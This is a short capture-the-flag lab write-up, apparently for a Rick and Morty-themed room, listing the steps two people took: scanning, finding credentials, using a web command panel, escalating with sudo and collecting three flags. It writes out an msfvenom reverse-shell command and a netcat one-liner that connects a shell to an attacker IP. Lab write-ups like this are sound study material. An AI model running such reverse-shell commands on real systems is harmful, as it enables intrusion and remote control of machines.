+ Ran initial and all vuln nmap scan
+ Navigate to the IP on browser
+ Looked at source to find username [R1ckRul3s]
+ Found login.php and robots.txt path based on nmap output
+ robots.txt has the password [Wubbalubbadubdub]
+ Found a base64'd string that says `rabbit hole`
+ Logged into login.php using username:password [R1ckRul3s:Wubbalubbadubdub]
+ Command Panel executes basic linux commands
+ Used ls and less to get first ingredient [mr. meeseek hair]
+ Also found clue -> `Look around the file system for the other ingredient.`
+ Found second ingredient by just looking around, in /home/rick [1 jerry tear]
+ Created reverse shell using msfvenom with cmd `msfvenom -p cmd/unix/reverse_netcat LHOST=10.11.4.238 LPORT=6969 -f raw`
	`mkfifo /tmp/mmhv; nc 10.11.4.238 6969 0</tmp/mmhv | /bin/sh >/tmp/mmhv 2>&1; rm /tmp/mmhv`
+ Performed privesc by just `sudo su`
+ Found third and last flag in root's home [fleeb juice]


JH's Steps
-------------
+ Ran nmap
+ Ran `nikto -h http://$IP | tee nikto.log`
+ Ran `gobuster -u http://$IP -w /opt/directory-list-2.3-medium.txt -x php,sh,yxy,cgi,html,js,css,py`
+ Found the cmd panel
+ Used `while read line; do echo $line; done < clue.txt` to read contents of files
+ `grep . clue.txt` also works; `grep -R .` recursively greps everything
+ Used pentestmonkey's cheatsheet to get python reverse shell
+ python is not installed but python3 is
+ Got stable shell using his own poor-mans-project stabilize shell technique


